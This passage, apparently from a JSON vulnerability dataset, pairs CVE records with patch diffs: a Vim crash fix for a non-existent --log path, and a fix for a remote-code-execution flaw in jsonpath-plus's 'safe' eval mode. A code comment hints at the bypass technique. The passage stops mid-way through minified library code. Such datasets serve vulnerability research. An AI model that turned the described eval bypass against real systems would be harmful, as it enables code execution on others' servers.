                "content": "patch 9.1.1097: --log with non-existent path causes a crash\n\nProblem:  --log with non-existent path causes a crash\n          (Ekkosun)\nSolution: split initialization phase and init the execution stack\n          earlier (Hirohito Higashi)\n\nfixes: #16606\ncloses: #16610\n\nSigned-off-by: Hirohito Higashi <h.east.727@gmail.com>\nSigned-off-by: Christian Brabandt <cb@256bit.org>\n\nFilename: src/main.c:\n```\n@@ -144,6 +144,11 @@\nmain\n     atexit(vim_mem_profile_dump);\n #endif\n \n+    /*\n+     * Various initialisations #1 shared with tests.\n+     */\n+    common_init_1();\n+\n #if defined(STARTUPTIME) || defined(FEAT_JOB_CHANNEL)\n     // Need to find \"--startuptime\" and \"--log\" before actually parsing\n     // arguments.\n\n@@ -185,9 +190,9 @@\nmain\n #endif\n \n     /*\n-     * Various initialisations shared with tests.\n+     * Various initialisations #2 shared with tests.\n      */\n-    common_init(&params);\n+    common_init_2(&params);\n \n #ifdef VIMDLL\n     // Check if the current executable file is for the GUI subsystem.\n\n@@ -900,10 +905,10 @@\nvim_main2(void)\n }\n \n /*\n- * Initialisation shared by main() and some tests.\n+ * Initialisation #1 shared by main() and some tests.\n  */\n     void\n-common_init(mparm_T *paramp)\n+common_init_1(void)\n {\n     estack_init();\n     cmdline_init();\n\n@@ -925,7 +930,15 @@\ncommon_init(mparm_T *paramp)\n \t    || (NameBuff = alloc(MAXPATHL)) == NULL)\n \tmch_exit(0);\n     TIME_MSG(\"Allocated generic buffers\");\n+}\n+\n \n+/*\n+ * Initialisation #2 shared by main() and some tests.\n+ */\n+    void\n+common_init_2(mparm_T *paramp)\n+{\n #ifdef NBDEBUG\n     // Wait a moment for debugging NetBeans.  Must be after allocating\n     // NameBuff.\n```\n\nFilename: src/message_test.c:\n```\n@@ -508,7 +508,8 @@\nmain(int argc, char **argv)\n     CLEAR_FIELD(params);\n     params.argc = argc;\n     params.argv = argv;\n-    common_init(&params);\n+    common_init_1();\n+    common_init_2(&params);\n \n     set_option_value_give_err((char_u *)\"encoding\", 0, (char_u *)\"utf-8\", 0);\n     init_chartab();\n```\n\nFilename: src/proto/main.pro:\n```\n@@ -1,6 +1,7 @@\n/* main.c */\n int vim_main2(void);\n-void common_init(mparm_T *paramp);\n+void common_init_1(void);\n+void common_init_2(mparm_T *paramp);\n int is_not_a_term(void);\n int is_not_a_term_or_gui(void);\n void free_vbuf(void);\n```\n\nFilename: src/testdir/test_startup.vim:\n```\n@@ -740,6 +740,13 @@\nfunc Test_log()\n   call delete('Xlogfile')\n endfunc\n \n+func Test_log_nonexistent()\n+  \" this used to crash Vim\n+  CheckFeature channel\n+  let result = join(systemlist(GetVimCommand() .. ' --log /X/Xlogfile -c qa!'))\n+  call assert_match(\"E484: Can't open file\", result)\n+endfunc\n+\n func Test_read_stdin()\n   let after =<< trim [CODE]\n     write Xtestout\n```\n\nFilename: src/version.c:\n```\n@@ -704,6 +704,8 @@\nstatic char *(features[]) =\n \n static int included_patches[] =\n {   /* Add new patch number below this line */\n+/**/\n+    1097,\n /**/\n     1096,\n /**/\n```",
                "url": "https://github.com/vim/vim/commit/c5654b84480822817bb7b69ebc97c174c91185e9"
            }
        ],
        "published_date": "2025-02-12T18:31:06.472Z",
        "sec_adv": [],
        "sw_version": "v9.1.1096",
        "sw_version_wget": "https://github.com/vim/vim/archive/refs/tags/v9.1.1096.zip"
    },
    "CVE-2025-1302": {
        "cwe": [
            {
                "id": "CWE-94",
                "value": "Remote Code Execution (RCE)"
            }
        ],
        "description": "Versions of the package jsonpath-plus before 10.3.0 are vulnerable to Remote Code Execution (RCE) due to improper input sanitization. An attacker can execute aribitrary code on the system by exploiting the unsafe default usage of eval='safe' mode.\r\r**Note:**\r\rThis is caused by an incomplete fix for [CVE-2024-21534](https://security.snyk.io/vuln/SNYK-JS-JSONPATHPLUS-7945884).",
        "languages": [
            "JavaScript"
        ],
        "patch_commits": [
            {
                "content": "fix(eval): rce using non-string prop names\n\nref: https://gist.github.com/nickcopi/11ba3cb4fdee6f89e02e6afae8db6456\n\nFilename: badges/tests-badge.svg:\n```\n@@ -1 +1 @@\n-<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"97\" height=\"20\"><defs><style>text{font-size:11px;font-family:Verdana,DejaVu Sans,Geneva,sans-serif}text.shadow{fill:#010101;fill-opacity:.3}text.high{fill:#fff}</style><linearGradient id=\"smooth\" x2=\"0\" y2=\"100%\"><stop offset=\"0\" stop-color=\"#aaa\" stop-opacity=\".1\"/><stop offset=\"1\" stop-opacity=\".1\"/></linearGradient><mask id=\"round\"><rect width=\"100%\" height=\"100%\" rx=\"3\" fill=\"#fff\"/></mask></defs><g id=\"bg\" mask=\"url(#round)\"><path fill=\"#696969\" d=\"M0 0h41v20H0z\"/><path fill=\"#4c1\" d=\"M41 0h56v20H41z\"/><path fill=\"url(#smooth)\" d=\"M0 0h97v20H0z\"/></g><g id=\"fg\"><text class=\"shadow\" x=\"5.5\" y=\"15\">Tests</text><text class=\"high\" x=\"5\" y=\"14\">Tests</text><text class=\"shadow\" x=\"46.5\" y=\"15\">273/273</text><text class=\"high\" x=\"46\" y=\"14\">273/273</text></g></svg>\n\\ No newline at end of file\n+<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"97\" height=\"20\"><defs><style>text{font-size:11px;font-family:Verdana,DejaVu Sans,Geneva,sans-serif}text.shadow{fill:#010101;fill-opacity:.3}text.high{fill:#fff}</style><linearGradient id=\"smooth\" x2=\"0\" y2=\"100%\"><stop offset=\"0\" stop-color=\"#aaa\" stop-opacity=\".1\"/><stop offset=\"1\" stop-opacity=\".1\"/></linearGradient><mask id=\"round\"><rect width=\"100%\" height=\"100%\" rx=\"3\" fill=\"#fff\"/></mask></defs><g id=\"bg\" mask=\"url(#round)\"><path fill=\"#696969\" d=\"M0 0h41v20H0z\"/><path fill=\"#4c1\" d=\"M41 0h56v20H41z\"/><path fill=\"url(#smooth)\" d=\"M0 0h97v20H0z\"/></g><g id=\"fg\"><text class=\"shadow\" x=\"5.5\" y=\"15\">Tests</text><text class=\"high\" x=\"5\" y=\"14\">Tests</text><text class=\"shadow\" x=\"46.5\" y=\"15\">275/275</text><text class=\"high\" x=\"46\" y=\"14\">275/275</text></g></svg>\n\\ No newline at end of file\n```\n\nFilename: dist/index-browser-esm.js:\n```\n@@ -1297,8 +1297,13 @@\nconst SafeEval = {\n     return ast.value;\n   },\n   evalMemberExpression(ast, subs) {\n-    const prop = ast.computed ? SafeEval.evalAst(ast.property) // `object[property]`\n-    : ast.property.name; // `object.property` property is Identifier\n+    const prop = String(\n+    // NOTE: `String(value)` throws error when\n+    // value has overwritten the toString method to return non-string\n+    // i.e. `value = {toString: () => []}`\n+    ast.computed ? SafeEval.evalAst(ast.property) // `object[property]`\n+    : ast.property.name // `object.property` property is Identifier\n+    );\n     const obj = SafeEval.evalAst(ast.object, subs);\n     if (obj === undefined || obj === null) {\n       throw TypeError(`Cannot read properties of ${obj} (reading '${prop}')`);\n```\n\nFilename: dist/index-browser-esm.min.js:\n```\n@@ -1,2 +1,2 @@\n-class e{static get version(){return\"1.4.0\"}static toString(){return\"JavaScript Expression Parser (JSEP) v\"+e.version}static addUnaryOp(t){return e.max_unop_len=Math.max(t.length,e.max_unop_len),e.unary_ops[t]=1,e}static addBinaryOp(t,r,s){return e.max_binop_len=Math.max(t.length,e.max_binop_len),e.binary_ops[t]=r,s?e.right_associative.add(t):e.right_associative.delete(t),e}static addIdentifierChar(t){return e.additional_identifier_chars.add(t),e}static addLiteral(t,r){return e.literals[t]=r,e}static removeUnaryOp(t){return delete e.unary_ops[t],t.length===e.max_unop_len&&(e.max_unop_len=e.getMaxKeyLen(e.unary_ops)),e}static removeAllUnaryOps(){return e.unary_ops={},e.max_unop_len=0,e}static removeIdentifierChar(t){return e.additional_identifier_chars.delete(t),e}static removeBinaryOp(t){return delete e.binary_ops[t],t.length===e.max_binop_len&&(e.max_binop_len=e.getMaxKeyLen(e.binary_ops)),e.right_associative.delete(t),e}static removeAllBinaryOps(){return e.binary_ops={},e.max_binop_len=0,e}static removeLiteral(t){return delete e.literals[t],e}static removeAllLiterals(){return e.literals={},e}get char(){return this.expr.charAt(this.index)}get code(){return this.expr.charCodeAt(this.index)}constructor(e){this.expr=e,this.index=0}static parse(t){return new e(t).parse()}static getMaxKeyLen(e){return Math.max(0,...Object.keys(e).map((e=>e.length)))}static isDecimalDigit(e){return e>=48&&e<=57}static binaryPrecedence(t){return e.binary_ops[t]||0}static isIdentifierStart(t){return t>=65&&t<=90||t>=97&&t<=122||t>=128&&!e.binary_ops[String.fromCharCode(t)]||e.additional_identifier_chars.has(String.fromCharCode(t))}static isIdentifierPart(t){return e.isIdentifierStart(t)||e.isDecimalDigit(t)}throwError(e){const t=new Error(e+\" at character \"+this.index);throw t.index=this.index,t.description=e,t}runHook(t,r){if(e.hooks[t]){const s={context:this,node:r};return e.hooks.run(t,s),s.node}return r}searchHook(t){if(e.hooks[t]){const r={context:this};return e.hooks[t].find((function(e){return e.call(r.context,r),r.node})),r.node}}gobbleSpaces(){let t=this.code;for(;t===e.SPACE_CODE||t===e.TAB_CODE||t===e.LF_CODE||t===e.CR_CODE;)t=this.expr.charCodeAt(++this.index);this.runHook(\"gobble-spaces\")}parse(){this.runHook(\"before-all\");const t=this.gobbleExpressions(),r=1===t.length?t[0]:{type:e.COMPOUND,body:t};return this.runHook(\"after-all\",r)}gobbleExpressions(t){let r,s,n=[];for(;this.index<this.expr.length;)if(r=this.code,r===e.SEMCOL_CODE||r===e.COMMA_CODE)this.index++;else if(s=this.gobbleExpression())n.push(s);else if(this.index<this.expr.length){if(r===t)break;this.throwError('Unexpected \"'+this.char+'\"')}return n}gobbleExpression(){const e=this.searchHook(\"gobble-expression\")||this.gobbleBinaryExpression();return this.gobbleSpaces(),this.runHook(\"after-expression\",e)}gobbleBinaryOp(){this.gobbleSpaces();let t=this.expr.substr(this.index,e.max_binop_len),r=t.length;for(;r>0;){if(e.binary_ops.hasOwnProperty(t)&&(!e.isIdentifierStart(this.code)||this.index+t.length<this.expr.length&&!e.isIdentifierPart(this.expr.charCodeAt(this.index+t.length))))return this.index+=r,t;t=t.substr(0,--r)}return!1}gobbleBinaryExpression(){let t,r,s,n,i,a,o,h,l;if(a=this.gobbleToken(),!a)return a;if(r=this.gobbleBinaryOp(),!r)return a;for(i={value:r,prec:e.binaryPrecedence(r),right_a:e.right_associative.has(r)},o=this.gobbleToken(),o||this.throwError(\"Expected expression after \"+r),n=[a,i,o];r=this.gobbleBinaryOp();){if(s=e.binaryPrecedence(r),0===s){this.index-=r.length;break}i={value:r,prec:s,right_a:e.right_associative.has(r)},l=r;const h=e=>i.right_a&&e.right_a?s>e.prec:s<=e.prec;for(;n.length>2&&h(n[n.length-2]);)o=n.pop(),r=n.pop().value,a=n.pop(),t={type:e.BINARY_EXP,operator:r,left:a,right:o},n.push(t);t=this.gobbleToken(),t||this.throwError(\"Expected expression after \"+l),n.push(i,t)}for(h=n.length-1,t=n[h];h>1;)t={type:e.BINARY_EXP,operator:n[h-1].value,left:n[h-2],right:t},h-=2;return t}gobbleToken(){let t,r,s,n;if(this.gobbleSpaces(),n=this.searchHook(\"gobble-token\"),n)return this.runHook(\"after-token\",n);if(t=this.code,e.isDecimalDigit(t)||t===e.PERIOD_CODE)return this.gobbleNumericLiteral();if(t===e.SQUOTE_CODE||t===e.DQUOTE_CODE)n=this.gobbleStringLiteral();else if(t===e.OBRACK_CODE)n=this.gobbleArray();else{for(r=this.expr.substr(this.index,e.max_unop_len),s=r.length;s>0;){if(e.unary_ops.hasOwnProperty(r)&&(!e.isIdentifierStart(this.code)||this.index+r.length<this.expr.length&&!e.isIdentifierPart(this.expr.charCodeAt(this.index+r.length)))){this.index+=s;const t=this.gobbleToken();return t||this.throwError(\"missing unaryOp argument\"),this.runHook(\"after-token\",{type:e.UNARY_EXP,operator:r,argument:t,prefix:!0})}r=r.substr(0,--s)}e.isIdentifierStart(t)?(n=this.gobbleIdentifier(),e.literals.hasOwnProperty(n.name)?n={type:e.LITERAL,value:e.literals[n.name],raw:n.name}:n.name===e.this_str&&(n={type:e.THIS_EXP})):t===e.OPAREN_CODE&&(n=this.gobbleGroup())}return n?(n=this.gobbleTokenProperty(n),this.runHook(\"after-token\",n)):this.runHook(\"after-token\",!1)}gobbleTokenProperty(t){this.gobbleSpaces();let r=this.code;for(;r===e.PERIOD_CODE||r===e.OBRACK_CODE||r===e.OPAREN_CODE||r===e.QUMARK_CODE;){let s;if(r===e.QUMARK_CODE){if(this.expr.charCodeAt(this.index+1)!==e.PERIOD_CODE)break;s=!0,this.index+=2,this.gobbleSpaces(),r=this.code}this.index++,r===e.OBRACK_CODE?((t={type:e.MEMBER_EXP,computed:!0,object:t,property:this.gobbleExpression()}).property||this.throwError('Unexpected \"'+this.char+'\"'),this.gobbleSpaces(),r=this.code,r!==e.CBRACK_CODE&&this.throwError(\"Unclosed [\"),this.index++):r===e.OPAREN_CODE?t={type:e.CALL_EXP,arguments:this.gobbleArguments(e.CPAREN_CODE),callee:t}:(r===e.PERIOD_CODE||s)&&(s&&this.index--,this.gobbleSpaces(),t={type:e.MEMBER_EXP,computed:!1,object:t,property:this.gobbleIdentifier()}),s&&(t.optional=!0),this.gobbleSpaces(),r=this.code}return t}gobbleNumericLiteral(){let t,r,s=\"\";for(;e.isDecimalDigit(this.code);)s+=this.expr.charAt(this.index++);if(this.code===e.PERIOD_CODE)for(s+=this.expr.charAt(this.index++);e.isDecimalDigit(this.code);)s+=this.expr.charAt(this.index++);if(t=this.char,\"e\"===t||\"E\"===t){for(s+=this.expr.charAt(this.index++),t=this.char,\"+\"!==t&&\"-\"!==t||(s+=this.expr.charAt(this.index++));e.isDecimalDigit(this.code);)s+=this.expr.charAt(this.index++);e.isDecimalDigit(this.expr.charCodeAt(this.index-1))||this.throwError(\"Expected exponent (\"+s+this.char+\")\")}return r=this.code,e.isIdentifierStart(r)?this.throwError(\"Variable names cannot start with a number (\"+s+this.char+\")\"):(r===e.PERIOD_CODE||1===s.length&&s.charCodeAt(0)===e.PERIOD_CODE)&&this.throwError(\"Unexpected period\"),{type:e.LITERAL,value:parseFloat(s),raw:s}}gobbleStringLiteral(){let t=\"\";const r=this.index,s=this.expr.charAt(this.index++);let n=!1;for(;this.index<this.expr.length;){let e=this.expr.charAt(this.index++);if(e===s){n=!0;break}if(\"\\\\\"===e)switch(e=this.expr.charAt(this.index++),e){case\"n\":t+=\"\\n\";break;case\"r\":t+=\"\\r\";break;case\"t\":t+=\"\\t\";break;case\"b\":t+=\"\\b\";break;case\"f\":t+=\"\\f\";break;case\"v\":t+=\"\\v\";break;default:t+=e}else t+=e}return n||this.throwError('Unclosed quote after \"'+t+'\"'),{type:e.LITERAL,value:t,raw:this.expr.substring(r,this.index)}}gobbleIdentifier(){let t=this.code,r=this.index;for(e.isIdentifierStart(t)?this.index++:this.throwError(\"Unexpected \"+this.char);this.index<this.expr.length&&(t=this.code,e.isIdentifierPart(t));)this.index++;return{type:e.IDENTIFIER,name:this.expr.slice(r,this.index)}}gobbleArguments(t){const r=[];let s=!1,n=0;for(;this.index<this.expr.length;){this.gobbleSpaces();let i=this.code;if(i===t){s=!0,this.index++,t===e.CPAREN_CODE&&n&&n>=r.length&&this.throwError(\"Unexpected token \"+String.fromCharCode(t));break}if(i===e.COMMA_CODE){if(this.index++,n++,n!==r.length)if(t===e.CPAREN_CODE)this.throwError(\"Unexpected token ,\");else if(t===e.CBRACK_CODE)for(let e=r.length;e<n;e++)r.push(null)}else if(r.length!==n&&0!==n)this.throwError(\"Expected comma\");else{const t=this.gobbleExpression();t&&t.type!==e.COMPOUND||this.throwError(\"Expected comma\"),r.push(t)}}return s||this.throwError(\"Expected \"+String.fromCharCode(t)),r}gobbleGroup(){this.index++;let t=this.gobbleExpressions(e.CPAREN_CODE);if(this.code===e.CPAREN_CODE)return this.index++,1===t.length?t[0]:!!t.length&&{type:e.SEQUENCE_EXP,expressions:t};this.throwError(\"Unclosed (\")}gobbleArray(){return this.index++,{type:e.ARRAY_EXP,elements:this.gobbleArguments(e.CBRACK_CODE)}}}const t=new class{add(e,t,r){if(\"string\"!=typeof arguments[0])for(let e in arguments[0])this.add(e,arguments[0][e],arguments[1]);else(Array.isArray(e)?e:[e]).forEach((function(e){this[e]=this[e]||[],t&&this[e][r?\"unshift\":\"push\"](t)}),this)}run(e,t){this[e]=this[e]||[],this[e].forEach((function(e){e.call(t&&t.context?t.context:t,t)}))}};Object.assign(e,{hooks:t,plugins:new class{constructor(e){this.jsep=e,this.registered={}}register(){for(var e=arguments.length,t=new Array(e),r=0;r<e;r++)t[r]=arguments[r];t.forEach((e=>{if(\"object\"!=typeof e||!e.name||!e.init)throw new Error(\"Invalid JSEP plugin format\");this.registered[e.name]||(e.init(this.jsep),this.registered[e.name]=e)}))}}(e),COMPOUND:\"Compound\",SEQUENCE_EXP:\"SequenceExpression\",IDENTIFIER:\"Identifier\",MEMBER_EXP:\"MemberExpression\",LITERAL:\"Literal\",THIS_EXP:\"ThisExpression\",CALL_EXP:\"CallExpression\",UNARY_EXP:\"UnaryExpression\",BINARY_EXP:\"BinaryExpression\",ARRAY_EXP:\"ArrayExpression\",TAB_CODE:9,LF_CODE:10,CR_CODE:13,SPACE_CODE:32,PERIOD_CODE:46,COMMA_CODE:44,SQUOTE_CODE:39,DQUOTE_CODE:34,OPAREN_CODE:40,CPAREN_CODE:41,OBRACK_CODE:91,CBRACK_CODE:93,QUMARK_CODE:63,SEMCOL_CODE:59,COLON_CODE:58,unary_ops:{\"-\":1,\"!\":1,\"~\":1,\"+\":1},binary_ops:{\"||\":1,\"??\":1,\"&&\":2,\"|\":3,\"^\":4,\"&\":5,\"==\":6,\"!=\":6,\"===\":6,\"!==\":6,\"<\":7,\">\":7,\"<=\":7,\">=\":7,\"<<\":8,\">>\":8,\">>>\":8,\"+\":9,\"-\":9,\"*\":10,\"/\":10,\"%\":10,\"**\":11},right_associative:new Set([\"**\"]),additional_identifier_chars:new Set([\"$\",\"_\"]),literals:{true:!0,false:!1,null:null},this_str:\"this\"}),e.max_unop_len=e.getMaxKeyLen(e.unary_ops),e.max_binop_len=e.getMaxKeyLen(e.binary_ops);const r=t=>new e(t).parse(),s=Object.getOwnPropertyNames(class{});Object.getOwnPropertyNames(e).filter((e=>!s.includes(e)&&void 0===r[e])).forEach((t=>{r[t]=e[t]})),r.Jsep=e;var n={name:\"ternary\",init(e){e.hooks.add(\"after-expression\",(function(t){if(t.node&&this.code===e.QUMARK_CODE){this.index++;const r=t.node,s=this.gobbleExpression();if(s||this.throwError(\"Expected expression\"),this.gobbleSpaces(),this.code===e.COLON_CODE){this.index++;const n=this.gobbleExpression();if(n||this.throwError(\"Expected expression\"),t.node={type:\"ConditionalExpression\",test:r,consequent:s,alternate:n},r.operator&&e.binary_ops[r.operator]<=.9){let s=r;for(;s.right.operator&&e.binary_ops[s.right.operator]<=.9;)s=s.right;t.node.test=s.right,s.right=t.node,t.node=r}}else this.throwError(\"Expected :\")}}))}};r.plugins.register(n);var i={name:\"regex\",init(e){e.hooks.add(\"gobble-token\",(function(t){if(47===this.code){const r=++this.index;let s=!1;for(;this.index<this.expr.length;){if(47===this.code&&!s){const s=this.expr.slice(r,this.index);let n,i=\"\";for(;++this.index<this.expr.length;){const e=this.code;if(!(e>=97&&e<=122||e>=65&&e<=90||e>=48&&e<=57))break;i+=this.char}try{n=new RegExp(s,i)}catch(e){this.throwError(e.message)}return t.node={type:e.LITERAL,value:n,raw:this.expr.slice(r-1,this.index)},t.node=this.gobbleTokenProperty(t.node),t.node}this.code===e.OBRACK_CODE?s=!0:s&&this.code===e.CBRACK_CODE&&(s=!1),this.index+=92===this.code?2:1}this.throwError(\"Unclosed Regex\")}}))}};const a={name:\"assignment\",assignmentOperators:new Set([\"=\",\"*=\",\"**=\",\"/=\",\"%=\",\"+=\",\"-=\",\"<<=\",\">>=\",\">>>=\",\"&=\",\"^=\",\"|=\",\"||=\",\"&&=\",\"??=\"]),updateOperators:[43,45],assignmentPrecedence:.9,init(e){const t=[e.IDENTIFIER,e.MEMBER_EXP];function r(e){a.assignmentOperators.has(e.operator)?(e.type=\"AssignmentExpression\",r(e.left),r(e.right)):e.operator||Object.values(e).forEach((e=>{e&&\"object\"==typeof e&&r(e)}))}a.assignmentOperators.forEach((t=>e.addBinaryOp(t,a.assignmentPrecedence,!0))),e.hooks.add(\"gobble-token\",(function(e){const r=this.code;a.updateOperators.some((e=>e===r&&e===this.expr.charCodeAt(this.index+1)))&&(this.index+=2,e.node={type:\"UpdateExpression\",operator:43===r?\"++\":\"--\",argument:this.gobbleTokenProperty(this.gobbleIdentifier()),prefix:!0},e.node.argument&&t.includes(e.node.argument.type)||this.throwError(`Unexpected ${e.node.operator}`))})),e.hooks.add(\"after-token\",(function(e){if(e.node){const r=this.code;a.updateOperators.some((e=>e===r&&e===this.expr.charCodeAt(this.index+1)))&&(t.includes(e.node.type)||this.throwError(`Unexpected ${e.node.operator}`),this.index+=2,e.node={type:\"UpdateExpression\",operator:43===r?\"++\":\"--\",argument:e.node,prefix:!1})}})),e.hooks.add(\"after-expression\",(function(e){e.node&&r(e.node)}))}};r.plugins.register(i,a),r.addUnaryOp(\"typeof\"),r.addLiteral(\"null\",null),r.addLiteral(\"undefined\",void 0);const o=new Set([\"constructor\",\"__proto__\",\"__defineGetter__\",\"__defineSetter__\"]),h={evalAst(e,t){switch(e.type){case\"BinaryExpression\":case\"LogicalExpression\":return h.evalBinaryExpression(e,t);case\"Compound\":return h.evalCompound(e,t);case\"ConditionalExpression\":return h.evalConditionalExpression(e,t);case\"Identifier\":return h.evalIdentifier(e,t);case\"Literal\":return h.evalLiteral(e,t);case\"MemberExpression\":return h.evalMemberExpression(e,t);case\"UnaryExpression\":return h.evalUnaryExpression(e,t);case\"ArrayExpression\":return h.evalArrayExpression(e,t);case\"CallExpression\":return h.evalCallExpression(e,t);case\"AssignmentExpression\":return h.evalAssignmentExpression(e,t);default:throw SyntaxError(\"Unexpected expression\",e)}},evalBinaryExpression:(e,t)=>({\"||\":(e,t)=>e||t(),\"&&\":(e,t)=>e&&t(),\"|\":(e,t)=>e|t(),\"^\":(e,t)=>e^t(),\"&\":(e,t)=>e&t(),\"==\":(e,t)=>e==t(),\"!=\":(e,t)=>e!=t(),\"===\":(e,t)=>e===t(),\"!==\":(e,t)=>e!==t(),\"<\":(e,t)=>e<t(),\">\":(e,t)=>e>t(),\"<=\":(e,t)=>e<=t(),\">=\":(e,t)=>e>=t(),\"<<\":(e,t)=>e<<t(),\">>\":(e,t)=>e>>t(),\">>>\":(e,t)=>e>>>t(),\"+\":(e,t)=>e+t(),\"-\":(e,t)=>e-t(),\"*\":(e,t)=>e*t(),\"/\":(e,t)=>e/t(),\"%\":(e,t)=>e%t()}[e.operator](h.evalAst(e.left,t),(()=>h.evalAst(e.right,t)))),evalCompound(e,t){let r;for(let s=0;s<e.body.length;s++){\"Identifier\"===e.body[s].type&&[\"var\",\"let\",\"const\"].includes(e.body[s].name)&&e.body[s+1]&&\"AssignmentExpression\"===e.body[s+1].type&&(s+=1);const n=e.body[s];r=h.evalAst(n,t)}return r},evalConditionalExpression:(e,t)=>h.evalAst(e.test,t)?h.evalAst(e.consequent,t):h.evalAst(e.alternate,t),evalIdentifier(e,t){if(Object.hasOwn(t,e.name))return t[e.name];throw ReferenceError(`${e.name} is not defined`)},evalLiteral:e=>e.value,evalMemberExpression(e,t){const r=e.computed?h.evalAst(e.property):e.property.name,s=h.evalAst(e.object,t);if(null==s)throw TypeError(`Cannot read properties of ${s} (reading '${r}')`);if(!Object.hasOwn(s,r)&&o.has(r))throw TypeError(`Cannot read properties of ${s} (reading '${r}')`);const n=s[r];return\"function\"==typeof n?n.bind(s):n},evalUnaryExpression:(e,t)=>({\"-\":e=>-h.evalAst(e,t),\"!\":e=>!h.evalAst(e,t),\"~\":e=>~h.evalAst(e,t),\"+\":e=>+h.evalAst(e,t),typeof:e=>typeof h.evalAst(e,t)}[e.operator](e.argument)),evalArrayExpression:(e,t)=>e.elements.map((e=>h.evalAst(e,t))),evalCallExpression(e,t){const r=e.arguments.map((e=>h.evalAst(e,t)));return h.evalAst(e.callee,t)(...r)},evalAssignmentExpression(e,t){if(\"Identifier\"!==e.left.type)throw SyntaxError(\"Invalid left-hand side in assignment\");const r=e.left.name,s=h.evalAst(e.right,t);return t[r]=s,t[r]}};function l(e,t){return(e=e.slice()).push(t),e}function c(e,t){return(t=t.slice()).unshift(e),t}class p extends Error{constructor(e){super('JSONPath should not be called with \"new\" (it prevents return of (unwrapped) scalar values)'),this.avoidNew=!0,this.value=e,this.name=\"NewError\"}}function u(e,t,r,s,n){if(!(this instanceof u))try{return new u(e,t,r,s,n)}catch(e){if(!e.avoidNew)throw e;return e.value}\"string\"==typeof e&&(n=s,s=r,r=t,t=e,e=null);const i=e&&\"object\"==typeof e;if(e=e||{},this.json=e.json||r,this.path=e.path||t,this.resultType=e.resultType||\"value\",this.flatten=e.flatten||!1,this.wrap=!Object.hasOwn(e,\"wrap\")||e.wrap,this.sandbox=e.sandbox||{},this.eval=void 0===e.eval?\"safe\":e.eval,this.ignoreEvalErrors=void 0!==e.ignoreEvalErrors&&e.ignoreEvalErrors,this.parent=e.parent||null,this.parentProperty=e.parentProperty||null,this.callback=e.callback||s||null,this.otherTypeCallback=e.otherTypeCallback||n||function(){throw new TypeError(\"You must supply an otherTypeCallback callback option with the @other() operator.\")},!1!==e.autostart){const s={path:i?e.path:t};i?\"json\"in e&&(s.json=e.json):s.json=r;const n=this.evaluate(s);if(!n||\"object\"!=typeof n)throw new p(n);return n}}u.prototype.evaluate=function(e,t,r,s){let n=this.parent,i=this.parentProperty,{flatten:a,wrap:o}=this;if(this.currResultType=this.resultType,this.currEval=this.eval,this.currSandbox=this.sandbox,r=r||this.callback,this.currOtherTypeCallback=s||this.otherTypeCallback,t=t||this.json,(e=e||this.path)&&\"object\"==typeof e&&!Array.isArray(e)){if(!e.path&&\"\"!==e.path)throw new TypeError('You must supply a \"path\" property when providing an object argument to JSONPath.evaluate().');if(!Object.hasOwn(e,\"json\"))throw new TypeError('You must supply a \"json\" property when providing an object argument to JSONPath.evaluate().');({json:t}=e),a=Object.hasOwn(e,\"flatten\")?e.flatten:a,this.currResultType=Object.hasOwn(e,\"resultType\")?e.resultType:this.currResultType,this.currSandbox=Object.hasOwn(e,\"sandbox\")?e.sandbox:this.currSandbox,o=Object.hasOwn(e,\"wrap\")?e.wrap:o,this.currEval=Object.hasOwn(e,\"eval\")?e.eval:this.currEval,r=Object.hasOwn(e,\"callback\")?e.callback:r,this.currOtherTypeCallback=Object.hasOwn(e,\"otherTypeCallback\")?e.otherTypeCallback:this.currOtherTypeCallback,n=Object.hasOwn(e,\"parent\")?e.parent:n,i=Object.hasOwn(e,\"parentProperty\")?e.parentProperty:i,e=e.path}if(n=n||null,i=i||null,Array.isArray(e)&&(e=u.toPathString(e)),!e&&\"\"!==e||!t)return;const h=u.toPathArray(e);\"$\"===h[0]&&h.length>1&&h.shift(),this._hasParentSelector=null;const l=this._trace(h,t,[\"$\"],n,i,r).filter((function(e){return e&&!e.isParentSelector}));return l.length?o||1!==l.length||l[0].hasArrExpr?l.reduce(((e,t)=>{const r=this._getPreferredOutput(t);return a&&Array.isArray(r)?e=e.concat(r):e.push(r),e}),[]):this._getPreferredOutput(l[0]):o?[]:void 0},u.prototype._getPreferredOutput=function(e){const t=this.currResultType;switch(t){case\"all\":{const t=Array.isArray(e.path)?e.path:u.toPathArray(e.path);return e.pointer=u.toPointer(t),e.path=\"string\"==typeof e.path?e.path:u.toPathString(e.path),e}case\"value\":case\"parent\":case\"parentProperty\":return e[t];case\"path\":return u.toPathString(e[t]);case\"pointer\":return u.toPointer(e.path);default:throw new TypeError(\"Unknown result type\")}},u.prototype._handleCallback=function(e,t,r){if(t){const s=this._getPreferredOutput(e);e.path=\"string\"==typeof e.path?e.path:u.toPathString(e.path),t(s,r,e)}},u.prototype._trace=function(e,t,r,s,n,i,a,o){let h;if(!e.length)return h={path:r,value:t,parent:s,parentProperty:n,hasArrExpr:a},this._handleCallback(h,i,\"value\"),h;const p=e[0],u=e.slice(1),d=[];function f(e){Array.isArray(e)?e.forEach((e=>{d.push(e)})):d.push(e)}if((\"string\"!=typeof p||o)&&t&&Object.hasOwn(t,p))f(this._trace(u,t[p],l(r,p),t,p,i,a));else if(\"*\"===p)this._walk(t,(e=>{f(this._trace(u,t[e],l(r,e),t,e,i,!0,!0))}));else if(\"..\"===p)f(this._trace(u,t,r,s,n,i,a)),this._walk(t,(s=>{\"object\"==typeof t[s]&&f(this._trace(e.slice(),t[s],l(r,s),t,s,i,!0))}));else{if(\"^\"===p)return this._hasParentSelector=!0,{path:r.slice(0,-1),expr:u,isParentSelector:!0};if(\"~\"===p)return h={path:l(r,p),value:n,parent:s,parentProperty:null},this._handleCallback(h,i,\"property\"),h;if(\"$\"===p)f(this._trace(u,t,r,null,null,i,a));else if(/^(-?\\d*):(-?\\d*):?(\\d*)$/u.test(p))f(this._slice(p,u,t,r,s,n,i));else if(0===p.indexOf(\"?(\")){if(!1===this.currEval)throw new Error(\"Eval [?(expr)] prevented in JSONPath expression.\");const e=p.replace(/^\\?\\((.*?)\\)$/u,\"$1\"),a=/@.?([^?]*)[['](\\??\\(.*?\\))(?!.\\)\\])[\\]']/gu.exec(e);a?this._walk(t,(e=>{const 